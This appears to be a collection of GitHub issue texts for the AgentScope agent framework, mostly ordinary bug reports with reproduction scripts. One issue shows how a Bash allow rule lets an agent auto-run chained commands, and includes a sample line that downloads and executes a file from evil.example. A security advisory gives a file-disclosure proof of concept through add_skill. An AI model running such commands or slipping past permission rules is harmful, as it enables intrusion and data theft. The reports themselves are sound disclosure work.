problem_statement:
[Bug]: An approved Write/Edit permission suggestion matches a different set of directories than the call it was generated from
## Prerequisites

- [x] I have searched the existing [issues](https://github.com/agentscope-ai/agentscope/issues) and [discussions](https://github.com/agentscope-ai/agentscope/discussions), and this is not a duplicate.
- [x] This is a bug, not a usage question. (For questions, please use [Discussions](https://github.com/agentscope-ai/agentscope/discussions/new?category=general) instead.)

## Background / Description

`Write.generate_suggestions` builds the rule the user is asked to approve by
splicing a **literal filesystem path** into a glob **pattern**:

```python
# src/agentscope/tool/_builtin/_write.py:217-220
parent = self._backend.dirname(file_path)
# Glob patterns are POSIX-style strings (matched by fnmatch),
# not real filesystem paths — do NOT use backend.join_path here.
pattern = (parent.rstrip("/\\") + "/**") if parent else "**"
```

and `Write.match_rule` then evaluates that pattern with
`fnmatch.fnmatch(file_path, rule_content)` (`_write.py:193`). The parent path is
never escaped, so any character fnmatch treats as a metacharacter — `[`, `?`,
`*` — is reinterpreted. `Edit.generate_suggestions` is byte-for-byte the same
code (`_edit.py:240-243`, matcher at `_edit.py:216`).

Directory names containing brackets are not exotic (`reports [2024]/`,
`backup [old]/`, Objective-C category dirs, scraped-dataset dirs), so both
halves below are reachable in ordinary use:

1. **The approval is inert.** Approving the suggested rule does not allow the
   invocation that generated it, because `fnmatch` reads `[2024]` as a
   character class rather than three literal characters. The engine keeps
   returning `ask` no matter how many times the user approves — the loop the
   suggestion exists to prevent.
2. **The rule over-grants.** `/tmp/reports [2024]/**` also matches
   `/tmp/reports 2/other.csv` (class `[2024]` matches the single character
   `2`). The user approves one directory and silently allows a set of others.

This is engine-level behaviour and does reach `match_rule`: `Write`/`Edit` are
`is_read_only = False` (`_write.py:59`, `_edit.py:83`), so in
`PermissionMode.DEFAULT` the read-only fast path (`permission/_engine.py:168`)
does not fire, the allow-rule check runs at `_engine.py:194-198`, and step 6
(`_engine.py:201`) is what produced the suggestion in the first place.

## Steps to Reproduce

Runs as-is; no network, no API key, no sandbox.

```python
import asyncio

from agentscope.permission import (
    PermissionContext,
    PermissionEngine,
    PermissionMode,
)
from agentscope.tool import Write


async def main() -> None:
    tool = Write()
    denied = {"file_path": "/tmp/reports [2024]/out.csv", "content": "hello"}
    unrelated = {"file_path": "/tmp/reports 2/other.csv", "content": "hello"}
    engine = PermissionEngine(PermissionContext(mode=PermissionMode.DEFAULT))

    first = await engine.check_permission(tool, denied)
    print("1st check          ->", first.behavior.value,
          [rule.rule_content for rule in first.suggested_rules])

    for rule in first.suggested_rules:  # the user approves the suggestion
        engine.add_rule(rule)

    second = await engine.check_permission(tool, denied)
    print("same call again    ->", second.behavior.value)

    third = await engine.check_permission(tool, unrelated)
    print("unrelated sibling  ->", third.behavior.value)


asyncio.run(main())
```

## Error Messages

No exception — the two outputs contradict each other. Actual, on `main`:

```
1st check          -> ask ['/tmp/reports [2024]/**']
same call again    -> ask
unrelated sibling  -> allow
```

Expected:

```
1st check          -> ask ['/tmp/reports [[]2024]/**']
same call again    -> allow
unrelated sibling  -> ask
```

The rule suggested for `/tmp/reports [2024]/out.csv` fails to match
`/tmp/reports [2024]/out.csv` while matching a path it was never derived from.

## Environment

- AgentScope version: `2.0.11dev`, `main` at
  `402c3664f70cb339f397c5ee40e662bc0d99eed0`
- Python: 3.12.12 (repo requires `>=3.11`)
- OS: macOS (reproduces on any OS — only `fnmatch` string semantics are
  involved; no filesystem access is needed)

## Suggested fix

Escape the literal parent before splicing: `glob.escape(parent)` (stdlib; on
POSIX it wraps exactly `*?[` in character classes, and it leaves a Windows drive
prefix alone). Two lines in each of `_write.py` and `_edit.py`, no change to
`match_rule` semantics.

For a metacharacter-free path the emitted pattern is unchanged
(`/tmp/probe/reports/**` before and after), so no existing expectation moves.

## Scope I am *not* claiming

- `Read`, `Glob` and `Grep` contain the same unescaped splice
  (`_read.py:248`, `_glob.py:213`, `_grep.py:248`), but their ALLOW suggestions
  are never consulted: they are `is_read_only = True`, so the engine returns at
  the read-only fast path (`_engine.py:168-172`) before it reaches the allow
  rules. Reporting them would be a cosmetic diff with no observable effect, so
  this issue is limited to the two tools whose approval flow is actually broken.
- `Bash.generate_suggestions` (`_bash.py:493`) has a separate, differently-shaped
  round-trip gap for compound commands: `cd /tmp && git commit -m x` suggests
  `git commit:*`, which `match_rule`'s own documented prefix contract
  (`_bash.py:406`, implemented at `_bash.py:428` as
  `command.startswith(prefix + " ")`) can never match. Closing that gap means
  changing how compound commands are matched — a security-semantics decision
  rather than a call-site bug — so I am deliberately not bundling it here.

problem_statement:
[Bug]: InMemoryMessageBus does not refresh queue TTL on successive pushes
### Prerequisites

- [x] I have searched the existing [issues](https://github.com/agentscope-ai/agentscope/issues) and [discussions](https://github.com/agentscope-ai/agentscope/discussions), and this is not a duplicate.
- [x] This is a bug, not a usage question. (For questions, please use [Discussions](https://github.com/agentscope-ai/agentscope/discussions/new?category=general) instead.)

### Background / Description

The MessageBus.queue_push contract defines ttl_secs as a sliding TTL for the queue key: every push with a TTL should refresh the lifetime of the whole queue. RedisMessageBus implements this with XADD followed by EXPIRE. InMemoryMessageBus instead stores an expiry time on each entry, so an earlier payload can disappear while later payloads in the same active queue remain.

This affects ChannelGateway._aggregate_media, which buffers media-only messages until text arrives. With the production 300-second TTL and a simulated clock, an image at t=0, a second image at t=240, and text at t=360 return only the second image plus text from the in-memory backend. No live bot was used.

Expected: the second push refreshes the queue key deadline, so both images are returned at t=360. Actual: the first image expires at its original deadline.

Source: [queue contract](https://github.com/agentscope-ai/agentscope/blob/ed357feb78a45ff02df155bb5610eab9bf543832/src/agentscope/app/message_bus/_base.py#L96-L120), [Redis implementation](https://github.com/agentscope-ai/agentscope/blob/ed357feb78a45ff02df155bb5610eab9bf543832/src/agentscope/app/message_bus/_redis_message_bus.py#L225-L255), [in-memory implementation](https://github.com/agentscope-ai/agentscope/blob/ed357feb78a45ff02df155bb5610eab9bf543832/src/agentscope/app/message_bus/_in_memory_message_bus.py#L130-L161), [media buffer](https://github.com/agentscope-ai/agentscope/blob/ed357feb78a45ff02df155bb5610eab9bf543832/src/agentscope/app/channel/_gateway.py#L254-L271).

### Error Messages

```shell
No exception is raised. The reproduction prints ['second']; the documented sliding-TTL behavior should print ['first', 'second'].
```

### Steps to Reproduce

From the repository root, install the development dependencies (`pip install -e ".[dev]"`), save this as `repro.py`, and run `python repro.py`:

```python
import asyncio
from unittest.mock import patch

from agentscope.app.message_bus import InMemoryMessageBus
from agentscope.app.message_bus import _in_memory_message_bus as bus_module


async def main():
    bus = InMemoryMessageBus()
    with patch.object(bus_module.time, "monotonic", return_value=0.0):
        await bus.queue_push("media", {"name": "first"}, ttl_secs=1)
    with patch.object(bus_module.time, "monotonic", return_value=0.5):
        await bus.queue_push("media", {"name": "second"}, ttl_secs=1)
    with patch.object(bus_module.time, "monotonic", return_value=1.1):
        entries = await bus.queue_drain("media")
    print([payload["name"] for _, payload in entries])


asyncio.run(main())
```

On unmodified main, output: `['second']`. Expected: `['first', 'second']`. The clock is simulated; no Redis server, network call, live channel bot, or long wait is needed.

### Environment

- AgentScope Version: 2.0.11dev (main commit ed357feb78a45ff02df155bb5610eab9bf543832)
- Python Version: 3.12.14
- OS: macOS 15.7.3, arm64
- Reproduced locally with the in-memory backend. Redis behavior was compared using fakeredis; no live Redis server or bot was used.
- Investigation and reproduction were assisted by Codex.

[Bug]: AnthropicChatModel leaves cached prompt tokens out of input_tokens, so budgets and usage undercount Claude calls
### Prerequisites

- [x] I have searched the existing issues and discussions, and this is not a duplicate.
- [x] This is a bug, not a usage question.

### Background / Description

`ChatUsage.input_tokens` means different things depending on the provider:

- OpenAI, DeepSeek and the other OpenAI-compatible models fill it from `prompt_tokens`, and Gemini fills it from `prompt_token_count`. Both of those **include** the cached prompt tokens.
- `AnthropicChatModel` fills it from Anthropic's `usage.input_tokens`, which **excludes** them. Anthropic reports cache reads and cache writes separately, in `cache_read_input_tokens` and `cache_creation_input_tokens` (see https://docs.anthropic.com/en/docs/build-with-claude/prompt-caching#tracking-cache-performance).

So with Claude, `input_tokens` holds only the uncached tail of the prompt. On a long agent loop with prompt caching that tail is often a few percent of the real prompt. Everything that reads `input_tokens` undercounts as a result:

- `ReplyBudgetControlMiddleware` computes `input_token_weight * input_tokens + ...`. The same `token_budget` therefore allows far more real tokens on Anthropic than on OpenAI, and the budget barely ever fires.
- The TUI and console token readouts, and the `gen_ai.usage.input_tokens` tracing attribute, show the uncached count only.
- `Msg.usage`, which accumulates through `ModelCallEndEvent`, has the same gap.

Expected: `input_tokens` is the whole prompt for every provider, and `cache_input_tokens` / `cache_creation_input_tokens` stay as breakdowns of it.

### Error Messages

```shell
No exception. A turn billed as 10 uncached + 200 cache-write + 3000 cache-read prompt tokens reports:
input_tokens = 10
cache_input_tokens = 3000
cache_creation_input_tokens = 200
```

### Steps to Reproduce

```python
import asyncio
from unittest.mock import AsyncMock, MagicMock

from anthropic import types

from agentscope.credential import AnthropicCredential
from agentscope.model import AnthropicChatModel

completion = types.Message.model_validate({
    "id": "msg", "type": "message", "role": "assistant",
    "model": "claude-sonnet-4-5", "stop_reason": "end_turn",
    "stop_sequence": None, "content": [{"type": "text", "text": "Hi"}],
    "usage": {"input_tokens": 10, "output_tokens": 5,
              "cache_creation_input_tokens": 200,
              "cache_read_input_tokens": 3000},
})

model = AnthropicChatModel(
    credential=AnthropicCredential(api_key="x"),
    model="claude-sonnet-4-5", stream=False, context_size=200_000,
)
model.client = MagicMock()
model.client.messages.create = AsyncMock(return_value=completion)

usage = asyncio.run(model([])).usage
print("input_tokens =", usage.input_tokens)  # 10, expected 3210
```

The streaming path (`message_start` usage) behaves the same way.

- AgentScope Version: main @ bdad647d
- Python Version: 3.11
- OS: macOS

problem_statement:
Bug: Bash allow rules match the raw compound command, so "git:*" silently auto-allows "git status && <any command>"
### Describe the bug

`BashTool.match_rule` applies its prefix / wildcard / substring patterns to the **raw command string**:

https://github.com/agentscope-ai/agentscope/blob/main/src/agentscope/tool/_builtin/_bash.py — `match_rule()`

```python
if rule_content.endswith(":*"):
    prefix = rule_content[:-2].strip()
    return command.startswith(prefix + " ") or command == prefix
```

For a compound command, the whole string starts with the first subcommand's text, so an ALLOW rule `git:*` matches not only `git status` but also:

```
git status && echo pwned > /tmp/pwned
git commit -m "x" && curl http://evil.example -o /tmp/p && chmod +x /tmp/p && /tmp/p
```

### Why this is practically reachable

`BashTool.generate_suggestions` itself proposes ALLOW rules in the `prefix:*` format (e.g. `git commit:*`) extracted from real usage — so users who accept the framework's own suggestions end up with exactly these rules.

### Why the safety net does not catch it

In DEFAULT mode the engine runs `check_permissions` before allow-rule matching. Its bypass-immune checks only cover: command substitution / process substitution / control-flow AST nodes, a short dangerous-pattern list (`rm -rf`, `dd`, `chmod 777`, ...), sensitive config files (`.bashrc`, `.env`, `.ssh/...`), and `rm` on system directories. A second command like `curl ... -o /tmp/x && chmod +x /tmp/x` or `echo x >> /tmp/file` passes all of them, and the compound command then reaches `_check_allow_rules`, where the `git:*` rule auto-ALLOWs the entire string.

### Expected behavior

A permission rule for Bash should only cover a compound command when it covers **every** subcommand (this is also what `split_compound_command()` in `_bash_parser.py` already supports — `is_read_only_command()` uses it, but `match_rule()` does not).

### Suggested fix

In `BashTool.match_rule`, split the command with the AST-based parser and require the pattern to match every subcommand. Single-command matching is unchanged.

I have a fix ready with regression tests and will submit a PR shortly.

problem_statement:
Unconfined source path in workspace add_skill copies arbitrary server directories into the agent workspace (server-side file disclosure)
### Prerequisites

- [x] I have searched the existing [issues](https://github.com/agentscope-ai/agentscope/issues) and [discussions](https://github.com/agentscope-ai/agentscope/discussions), and this is not a duplicate.
- [x] This is a bug, not a usage question. (For questions, please use [Discussions](https://github.com/agentscope-ai/agentscope/discussions/new?category=general) instead.)

### Background / Description

reported on 12 June 2026 https://github.com/agentscope-ai/agentscope/security/advisories/GHSA-2j4r-4qmg-x5h9 - no response, so trying here:


### Summary

The AgentScope workspace `add_skill` operation copies a caller-supplied source directory into the agent's skills directory using `shutil.copytree`. The destination is confined to the skills directory, but the source path is taken directly from the request body and is never confined. A caller can therefore copy an arbitrary server-side directory (any directory that contains, or into which the caller can plant, a valid `SKILL.md`) into the agent-readable workspace and read its contents back through the workspace skill listing. The HTTP API has no authentication (identity is a client-supplied header). Confirmed against the `LocalWorkspace.add_skill`: an arbitrary source directory was copied into the workspace.

### Details

`src/agentscope/workspace/_local_workspace.py`, `LocalWorkspace.add_skill` (method around line 934, sink around lines 1006 to 1007):

```python
# dest_path is confined to skills_dir (realpath startswith check, ~999-1003)
shutil.copytree(skill_path, dest_path, dirs_exist_ok=False)   # source skill_path NOT confined
```

`skill_path` flows from the request body: `AddSkillRequest.skill_path` (`src/agentscope/app/_router/_workspace.py` ~line 23) is passed straight to `await workspace.add_skill(body.skill_path)` (~line 197). There is no validation that the source is inside any allowed root. The only constraint is `_validate_and_hash_skill` (~line 428), which requires the source directory to contain a `SKILL.md` with `name` and `description` frontmatter; the rest of the directory's files are copied verbatim.

Authentication is a placeholder: `src/agentscope/app/deps.py` `get_current_user_id` (~lines 17 to 39) reads an `X-User-ID` header (docstring: "Temporary header-based identity; will be replaced by JWT auth"), so any caller supplies their own identity, and the official example binds `0.0.0.0`.



### Error Messages

```shell
Affected version: 2.0.1
```

### Steps to Reproduce

### PoC

Plant an outside-the-workspace directory containing a `SKILL.md` (the only constraint - the source must look like a skill) plus a sentinel secret, then have the real workspace manager copy it in. Source needs a `SKILL.md`; the destination check is present but the source path is honored unconfined.

```bash
# 1. prepare an attacker-readable secret directory OUTSIDE any workspace
mkdir -p /tmp/secretdir
printf -- '---\nname: x\ndescription: y\n---\n' > /tmp/secretdir/SKILL.md
echo SECRET > /tmp/secretdir/stolen.txt
```

```python
# 2. call the add_skill (or POST /workspace/skill {"skill_path":"/tmp/secretdir"} with an X-User-ID header)
ws = LocalWorkspace(workdir="/tmp/agentscope_ws/user-abc/session-1")
await ws.initialize()
await ws.add_skill("/tmp/secretdir")          # shutil.copytree(skill_path, dest) - skill_path NOT confined
```

```
# 3. HTTP form (auth is a placeholder X-User-ID header, deps.py:17-39):
POST /workspace/skill
X-User-ID: anyone
{"skill_path": "/tmp/secretdir"}
```

Validated against the `add_skill` (`_local_workspace.py:1006-1007` `shutil.copytree(skill_path, dest_path)`; dest confined at `:999-1003` via realpath/startswith, source `skill_path` from `AddSkillRequest.skill_path` not confined): the contents of `/tmp/secretdir` (the sentinel) were copied into `/tmp/agentscope_ws/user-abc/session-1/skills/<SkillName>/`, readable via the workspace skills listing.

### Impact

A caller (unauthenticated, given the placeholder header identity) can copy arbitrary server-side directories into the agent-readable workspace and exfiltrate their contents, disclosing server files such as configuration, credentials directories, or other tenants' workspaces, subject only to the `SKILL.md` requirement (which the caller can satisfy by first planting a `SKILL.md` via the agent's own write capability, or by targeting directories that already contain one).

### Remediation

Confine the source `skill_path` to an allowed root the same way the destination is confined: resolve `skill_path` and assert it stays within an approved skills-source directory (reject absolute paths and `..`), before calling `shutil.copytree`. Do not accept an arbitrary server filesystem path from the request. Replace the placeholder `X-User-ID` identity with authentication before exposing the workspace API.


### Environment

-
hints_text:
I am working on a focused service-boundary fix for this. The HTTP endpoint will be disabled for server-path imports by default and `create_app` will accept explicit trusted `skill_source_roots`; client-selected paths will be canonicalized with symlink resolution and confined with `commonpath`. This preserves trusted Python `WorkspaceBase.add_skill(...)` calls and manager `skill_paths`, including the local-path behavior covered by #2053, while preventing an HTTP caller from selecting arbitrary host paths. I am adding router coverage for the disabled default, allowed descendants, parent/prefix escapes, and symlink escapes.
Hi @geo-chen, thanks for the detailed report and for following up here.

You're right that the current `add_skill` HTTP endpoint accepting an arbitrary server-side path is fundamentally wrong for a service designed for distributed deployment. The root issue is not just missing validation — it's the API design itself.

@RerankerGuo Thanks for stepping up to fix this! Before you go too far with the `skill_source_roots` approach, we'd like to suggest a more thorough redesign that better aligns with our long-term architecture:

1. **Client-side validation**: The UI should provide a directory picker component. Before uploading, the client validates that the selected directory contains a valid `SKILL.md` with required `name` and `description` frontmatter fields. This gives users instant feedback and avoids unnecessary server round-trips for invalid skills.
2. **File upload instead of server path**: Once validated on the client side, the skill directory contents are streamed to the server (e.g., as multipart form data). The server performs defensive re-validation of `SKILL.md`, but the primary gate is on the client. This eliminates the path traversal vector entirely by removing server-side path input from the HTTP API.
3. **Workspace interface update**: The uploaded bytes are passed to `workspace.add_skill()` — this means updating `WorkspaceBase.add_skill` to accept bytes/stream instead of a host filesystem path. Currently all implementations (`LocalWorkspace`, `SandboxedWorkspaceBase`) assume a local path string, which doesn't make sense in a distributed setting where the server has no access to the client's filesystem.

The `skill_source_roots` approach would patch the immediate vulnerability, but the underlying API contract (accepting a server filesystem path over HTTP) remains architecturally wrong for a distributed service. We'd prefer to fix it properly now rather than carry technical debt forward.

@RerankerGuo Would you be open to taking on this issue with the redesigned approach described above? Happy to discuss further if anything is unclear.

Thanks again to both of you!
I updated #2085 to implement the proposed upload boundary: browser directory selection and frontmatter validation, multipart relative-path upload, server-side revalidation, and a bytes-based `WorkspaceBase.add_skill` contract for local and sandbox workspaces. The previous `skill_source_roots` approach has been removed.

The backend record's `ended_at` remains `null`, so the created task has no user-specified end boundary. ### Test Data | Field | Test Value | | --- | --- | | Name | End Date Test | | Date | 2026-10-29 | | Time | 09:00 | | Timezone | Asia/Shanghai | | Frequency | Daily | | End Date | 2026-10-31 | ### Expected Behavior The selected end date should be saved as the task's end boundary: - The creation request should include the corresponding end time. - The backend record's `data.ended_at` should not be `null`. - The task details should display the corresponding end time. - The scheduler should not schedule executions beyond the end boundary. The maintainers can clarify whether the end date represents the start or the end of the selected day, but the selected date should not be silently ignored. ### Actual Behavior Executing the original frontend submission function produces a creation request that does not include the selected end date. Verification through the real HTTP creation endpoint shows that the persisted task record contains: ```json { "ended_at": null } ``` This means the selected end date does not take effect. Create a daily schedule from October 29 to January 31 of the following year: However, the schedule still appears on dates after the selected end date: Opening the task details from the schedule list also shows that no end date was saved: ### Root Cause Analysis and Proposed Fix The issue involves the following components: 1. `examples/web_ui/frontend/src/pages/schedule/create-schedule-dialog.tsx` - The date picker stores the selected end date in `form.endDate`. - `handleSubmit` does not use this value when constructing the creation request. 2. `src/agentscope/app/_router/_schema/_schedule.py` - `CreateScheduleRequest` does not define an `ended_at` field. 3. `src/agentscope/app/_router/_schedule.py` - `ended_at` is not set when creating `ScheduleData`, so it retains its default value of `None`. Regression tests should cover: - A selected end date is submitted and persisted. - Leaving the end date unset preserves the existing behavior of having no end boundary. - The scheduler does not schedule executions beyond the end boundary. - Invalid end boundaries, including those earlier than the start time, are appropriately validated. ### Error Messages ```shell No exception or error logs are produced. The selected end date is not saved, and the backend returns `data.ended_at` as `null`. ``` ### Steps to Reproduce ### 1. Prepare the environment From the AgentScope repository root, install the dependencies: ```bash python -m pip install -e ".[service,storage-sql]" aiosqlite jinja2 ``` ### 2. problem_statement:
[Bug]: unowned session and SOP deletes cancel other users' work before returning 404
### Prerequisites

- [x] I searched existing issues and PRs for session deletion, ownership, cancellation, and bus purging; I found no report of this delete-path defect. #3186 concerns the separate status endpoint.
- [x] This is a bug in existing deletion behavior.

### Background / Description

DELETE /sessions/{session_id} calls SessionService.delete_session() and returns 404 when it returns False. The service calls the user-scoped get_session(), but does not stop when the record is absent. It then broadcasts a cancel for the supplied session ID and purges its events, inbox, consumer, background-task registry, and checkpoint, regardless of whether storage deleted anything. The cancel broadcast reaches whichever process is running that ID.

A caller who knows another user's session ID can therefore receive 404 while cancelling that user's in-flight run and deleting their queued messages. The durable session remains, which makes the side effect especially confusing. This requires knowledge of a valid session ID; this report does not claim that IDs are enumerable.

The same ordering occurs in SOPService.delete_run(): it cancels local tasks under the supplied run ID before get_sop_run(user_id, run_id) checks ownership. A caller with another user's known SOP run ID can interrupt that run despite receiving False/404.

Expected: a missing or unowned session/run should return False/404 without touching its task or transient bus state.

### Observed behavior

Using AsyncSQLAlchemyStorage with in-memory SQLite and InMemoryMessageBus, I created a session owned by "victim", pushed one inbox message, and called SessionService.delete_session("attacker", "agent-1", victim_session_id):

~~~text
deleted: False
victim still stored: True
cancel broadcasts: 1
inbox after unauthorized delete: []
~~~

A second offline probe put a live task into SOPService._advancing["victim-run"], made get_sop_run("attacker", "victim-run") return None, and called delete_run():

~~~text
deleted: False victim advance cancelled: True
~~~

### Steps to reproduce

No model API or network is needed. In a local Python 3.11+ checkout with the service extras:

1. Open AsyncSQLAlchemyStorage("sqlite+aiosqlite:///:memory:") and InMemoryMessageBus.
2. Upsert an agent and session for "victim"; queue a payload under MessageBusKeys.inbox(session.id).
3. Patch bus.publish with wraps=bus.publish to count cancel broadcasts.
4. Call SessionService(storage, bus).delete_session("attacker", agent_id, session.id).
5. Observe False, one publish call, an empty inbox, and the victim session still present.

For the SOP path, set up a pending asyncio.Task in service._advancing[run_id], then call delete_run() with a user for whom storage.get_sop_run() returns None. The task is cancelled before ownership is checked.

### Environment

- AgentScope main at 2599410f46250cc7db54948fae378e7282bf9426 (2.0.12dev)
- Python 3.12, Windows; offline in-memory SQLite and message bus

### Proposed fix

Check the user-scoped storage record before any cancel or bus cleanup. Return False immediately for an unavailable session/run. Keep the current cancellation and cascade behavior for records that the caller owns. Add regressions proving an unowned delete preserves the victim's task and inbox, plus an owned-delete regression.

This report and the offline reproductions were prepared with Codex assistance; the observed behavior was verified locally.

problem_statement:
[Bug]: Six OpenAI-compatible multi-agent formatters emit a null system content for a textless system message
### Prerequisites

- [X] I have searched the existing issues and discussions, and this is not a duplicate.
- [X] This is a bug, not a usage question.

### Background

`SystemMsg("sys", [])` is a valid message. `_assert_system_content_blocks()` only checks the type of each block, so an empty list passes validation, and `Msg.get_text_content()` returns `None` when the message has no `TextBlock` (`src/agentscope/message/_base.py:155`).

The multi-agent formatters emit the system message as the first turn. Six of them copy that `None` directly into the system payload:

- `src/agentscope/formatter/_openai_formatter.py:575`
- `src/agentscope/formatter/_openai_response_formatter.py:554`
- `src/agentscope/formatter/_dashscope_formatter.py:576`
- `src/agentscope/formatter/_deepseek_formatter.py:377`
- `src/agentscope/formatter/_moonshot_formatter.py:467`
- `src/agentscope/formatter/_volcengine_formatter.py:414`

On current `main` (`bdad647`), formatting `[SystemMsg("sys", []), UserMsg("u", "hi")]` with any of these classes produces `{"role": "system", "content": None}`. OpenAI-compatible endpoints reject a non-assistant message with null content, so the first request in a multi-agent conversation fails with a 400 before the model is called. #1588 recorded the provider response for the same payload:

```text
400 Bad Request: messages[0] content should be a string or a list
```

This is the same failure mode that #2953 reported for an assistant turn with an empty `ThinkingBlock`, and the same value that #2950 already coerced in the Gemini multi-agent formatter. The Anthropic, MiniMax and Ollama multi-agent formatters build their system payload from a string and cannot hit this path. The chat formatters drop an empty system turn, but the multi-agent formatters always emit it.

### Reproduction

```python
import asyncio

from agentscope.formatter import OpenAIMultiAgentFormatter
from agentscope.message import SystemMsg, UserMsg

formatted = asyncio.run(
    OpenAIMultiAgentFormatter().format(
        [SystemMsg("sys", []), UserMsg("u", "hi")],
    ),
)
print(formatted[0])
# {'role': 'system', 'content': None}
```

I added `tests/formatter_system_message_test.py` with the six affected formatters. On `main` the OpenAI-compatible subtest fails for all six with `AssertionError: None is not an instance of <class 'str'>`; the sibling formatter and the non-empty system prompt cases pass.

### Environment

AgentScope `2.0.10dev`, `main` at `bdad647`; Python 3.12; Windows 11. The probe is offline and needs no API key.

### Expected behavior

A system turn should always carry a string. Replacing `msg.get_text_content()` with `msg.get_text_content() or ""` at the six sites keeps a real system prompt unchanged and turns the textless case into an empty string, which the endpoints accept. The Gemini formatter already does this.

I have the six-line change and the regression test ready. I ran the formatter suite on the branch: `163 passed, 20 subtests passed`; the new file alone gives `3 passed, 10 subtests passed`. Black 23.3.0, flake8 6.1.0, pylint 3.0.2 and mypy 1.7.0 all pass with the versions pinned in `.pre-commit-config.yaml`. I will open a PR with the fix and this test.

problem_statement:
[Bug]: Web UI does not save the selected schedule start time, allowing tasks to run early
### Prerequisites

- [x] I have searched the existing [issues](https://github.com/agentscope-ai/agentscope/issues) and [discussions](https://github.com/agentscope-ai/agentscope/discussions), and this is not a duplicate.
- [x] This is a bug, not a usage question. (For questions, please use [Discussions](https://github.com/agentscope-ai/agentscope/discussions/new?category=general) instead.)

### Background / Description

When creating a scheduled task on the Schedule page in the Web UI, the selected start date and time are not submitted to the backend as `started_at`.

The frontend only uses the selected time and some date components to generate a Cron expression. The backend always sets `ScheduleData.started_at` to the task creation time. As a result, the intended start boundary is lost, and the task may execute before the selected start time.

This issue affects all four frequencies:

| Frequency | Impact |
| --- | --- |
| Daily | May execute daily before the selected start date. |
| Weekly | The selected date determines the weekday, but the task may execute on that weekday before the start date. |
| Monthly | The selected date determines the day of the month, but the task may execute in earlier months. |
| Once | May execute in an earlier year. Annual recurrence is a separate issue. |

For example, suppose a task is created on October 30, 2026, with the following settings:

- Start date: November 1, 2026
- Time: 20:26
- Time zone: Asia/Shanghai
- Frequency: Daily
- End date: November 3, 2026

**Expected behavior**

The start time is saved as `2026-11-01T12:26:00.000Z`, corresponding to November 1, 2026, at 20:26 in Asia/Shanghai. The task runs only at 20:26 on November 1, 2, and 3, and never before the selected start time.

**Actual behavior**

The creation request does not include `started_at`, and the backend saves the creation time on October 30 as the start time. If 20:26 has not yet passed that day, the task may run that same day. Otherwise, it may still run early on October 31.

### Error Messages

```shell
The issue causes an incorrect start time to be saved and may allow tasks to execute early. No exception or error message is required for it to occur.

The code shows that:

- The frontend creation request does not include the selected `started_at`.
- The backend creation endpoint always uses `datetime.now().astimezone()` as the start time.

No runtime logs or stack traces are attached.
```

### Steps to Reproduce


1. Save the following code as `reproduce_schedule_start.py` in the repository root.

   The script reproduces the current frontend payload, which omits the selected start time. It uses the real request schema, creation handler, and scheduler validation, with mocked access checks, storage, and scheduler notifications.

   A start date 800 days in the future is used so that all four frequencies have a Cron match before the intended start boundary, including Once.

```python
import asyncio
from datetime import datetime, timedelta
from types import SimpleNamespace
from unittest.mock import AsyncMock
from zoneinfo import ZoneInfo

from agentscope.app._manager import SchedulerManager
from agentscope.app._router._schedule import create_schedule
from agentscope.app._router._schema._schedule import CreateScheduleRequest


async def main():
    timezone = "Asia/Shanghai"
    now = datetime.now(ZoneInfo(timezone))
    selected_start = (now + timedelta(days=800)).replace(
        second=0, microsecond=0,
    )
    h, m = selected_start.hour, selected_start.minute
    weekday = (selected_start.weekday() + 1) % 7

    expressions = {
        "Daily": f"{m} {h} * * *",
        "Weekly": f"{m} {h} * * {weekday}",
        "Monthly": f"{m} {h} {selected_start.day} * *",
        "Once": f"{m} {h} {selected_start.day} {selected_start.month} *",
    }

    access = SimpleNamespace(
        resolve_agent=AsyncMock(),
        get_resource=AsyncMock(),
    )
    scheduler = SimpleNamespace(
        validate_schedule=SchedulerManager.validate_schedule,
        notify_changed=AsyncMock(),
    )

    for frequency, cron in expressions.items():
        storage = SimpleNamespace(upsert_schedule=AsyncMock())

        # Match the current UI payload: selected_start is not submitted.
        body = CreateScheduleRequest(
            name=f"repro-{frequency}",
            cron_expression=cron,
            timezone=timezone,
            ended_at=selected_start + timedelta(days=2),
            agent_id="agent-1",
            chat_model_config={
                "type": "test",
                "credential_id": "credential-1",
                "model": "model-1",
                "parameters": {},
            },
        )

        await create_schedule(
            body,
            user_id="user-1",
            storage=storage,
            access=access,
            scheduler=scheduler,
        )

        record = storage.upsert_schedule.call_args.args[1]
        trigger = SchedulerManager.validate_schedule(record)
        next_fire = trigger.get_next_fire_time(None, now)

        print(f"{frequency}:")
        print(f"  Selected start: {selected_start.isoformat()}")
        print(f"  Saved start:    {record.data.started_at.isoformat()}")
        print(
            "  Next execution:",
            next_fire.isoformat() if next_fire else None,
        )

        assert record.data.started_at < selected_start
        assert next_fire is not None and next_fire < selected_start
        print("  BUG REPRODUCED: execution before the selected start\n")


asyncio.run(main())
```

2. From the repository root, run the following commands using Python 3.11 or later:

```bash
python -m pip install -e ".[service]"
python reproduce_schedule_start.py
```

3. Observe the output for Daily, Weekly, Monthly, and Once:

   - `Selected start` is the intended future start time.
   - `Saved start` is the task creation time.
   - `Next execution` falls before `Selected start`.
   - Each frequency prints `BUG REPRODUCED: execution before the selected start`.

   The assertions confirm the incorrect behavior; no exception is expected when the bug is reproduced.

4. To confirm the frontend omission, create a task on the Web UI Schedule page with a future start date and inspect `POST /schedule/` in the browser's Network panel. The request body does not include `started_at`.

**Expected behavior**

The frontend submits the selected start date and time as `started_at`, interpreted in the task's time zone. The backend saves that instant, and the scheduler excludes executions before it for all four frequencies.

Omitting `started_at` remains valid for API compatibility and should continue to default to the creation time. This script demonstrates the effect of the current UI omission; it is not a regression test that should pass unchanged after the frontend fix.

### Environment

- AgentScope Version: 2.0.12dev
- Python Version: 3.11.13
- OS: Ubuntu 22.04.5 LTS (x86_64, Linux 6.8.0-136-generic)

It's yours, @golitter. If there is no pull request and no word from you by 2026-11-13 the claim is released so nobody is blocked — a comment here renews it.
I plan to fix this issue by including `started_at` in the schedule creation request:

1. **Add the request field**  
   Add an optional `started_at` field to both the frontend and backend creation requests. The backend will accept it as `AwareDatetime | None = None`, requiring a UTC offset for non-null values.

2. **Unify frontend start-time conversion**  
   Follow the existing end-time approach to interpret the selected date and time in the task's time zone, then convert it to a UTC ISO string with seconds and milliseconds set to zero. Daily, Weekly, Monthly, and Once will share this conversion logic and always submit `started_at`.

3. **Persist and apply the start boundary**  
   Save the provided start time to the existing `ScheduleData.started_at` field. If the field is omitted or explicitly set to `null`, retain the current behavior of using the timezone-aware creation time. Reuse the existing scheduler boundaries and validation before persistence, without adding database migrations or runtime dependencies.

4. **Preserve each frequency's Cron rules**  
